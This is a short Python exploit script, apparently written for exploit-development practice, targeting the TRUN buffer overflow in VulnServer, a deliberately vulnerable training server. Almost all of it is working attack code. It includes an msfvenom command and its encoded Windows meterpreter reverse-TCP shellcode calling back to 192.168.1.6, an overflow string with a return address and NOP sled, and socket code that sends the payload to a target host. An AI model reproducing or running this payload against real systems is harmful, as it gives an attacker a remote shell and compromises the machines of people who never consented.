#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in VulnServer. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

#badchars = \x00

#shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=4444 -b '\x00' -f python

import sys
import socket

buf =  ""
buf += "\xba\xb0\xb9\x39\x79\xda\xce\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x56\x83\xc6\x04\x31\x56\x0f\x03\x56\xbf\x5b"
buf += "\xcc\x85\x57\x19\x2f\x76\xa7\x7e\xb9\x93\x96\xbe\xdd"
buf += "\xd0\x88\x0e\x95\xb5\x24\xe4\xfb\x2d\xbf\x88\xd3\x42"
buf += "\x08\x26\x02\x6c\x89\x1b\x76\xef\x09\x66\xab\xcf\x30"
buf += "\xa9\xbe\x0e\x75\xd4\x33\x42\x2e\x92\xe6\x73\x5b\xee"
buf += "\x3a\xff\x17\xfe\x3a\x1c\xef\x01\x6a\xb3\x64\x58\xac"
buf += "\x35\xa9\xd0\xe5\x2d\xae\xdd\xbc\xc6\x04\xa9\x3e\x0f"
buf += "\x55\x52\xec\x6e\x5a\xa1\xec\xb7\x5c\x5a\x9b\xc1\x9f"
buf += "\xe7\x9c\x15\xe2\x33\x28\x8e\x44\xb7\x8a\x6a\x75\x14"
buf += "\x4c\xf8\x79\xd1\x1a\xa6\x9d\xe4\xcf\xdc\x99\x6d\xee"
buf += "\x32\x28\x35\xd5\x96\x71\xed\x74\x8e\xdf\x40\x88\xd0"
buf += "\x80\x3d\x2c\x9a\x2c\x29\x5d\xc1\x38\x9e\x6c\xfa\xb8"
buf += "\x88\xe7\x89\x8a\x17\x5c\x06\xa6\xd0\x7a\xd1\xbf\xf7"
buf += "\x7c\x0d\x07\x97\x82\xae\x77\xb1\x40\xfa\x27\xa9\x61"
buf += "\x83\xac\x29\x8d\x56\x58\x20\x19\x99\x34\x35\xdf\x71"
buf += "\x46\x36\xce\xdd\xcf\xd0\xa0\x8d\x9f\x4c\x01\x7e\x5f"
buf += "\x3d\xe9\x94\x50\x62\x09\x97\xbb\x0b\xa0\x78\x15\x63"
buf += "\x5d\xe0\x3c\xff\xfc\xed\xeb\x85\x3f\x65\x19\x79\xf1"
buf += "\x8e\x68\x69\xe6\xe8\x92\x71\xf7\x9c\x92\x1b\xf3\x36"
buf += "\xc5\xb3\xf9\x6f\x21\x1c\x01\x5a\x32\x5b\xfd\x1b\x02"
buf += "\x17\xc8\x89\x2a\x4f\x35\x5e\xaa\x8f\x63\x34\xaa\xe7"
buf += "\xd3\x6c\xf9\x12\x1c\xb9\x6e\x8f\x89\x42\xc6\x63\x19"
buf += "\x2b\xe4\x5a\x6d\xf4\x17\x89\xed\xf3\xe7\x4f\xda\x5b"
buf += "\x8f\xaf\x5a\x5c\x4f\xda\x5a\x0c\x27\x11\x74\xa3\x87"
buf += "\xda\x5f\xec\x8f\x51\x0e\x5e\x2e\x65\x1b\x3e\xee\x66"
buf += "\xa8\x9b\x01\x1c\xc1\x1c\xe2\xe1\xcb\x78\xe3\xe1\xf3"
buf += "\x7e\xd8\x37\xca\xf4\x1f\x84\x69\x06\x2a\xa9\xd8\x8d"
buf += "\x54\xfd\x1b\x84"

nop="\x90"*10

evil = "TRUN /.../" +  "A"* 2002 + "\x05\x12\x50\x62" + nop + buf + "\x90"* (3060-len(buf))

s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.4',9999))
s.send(evil)
s.close()
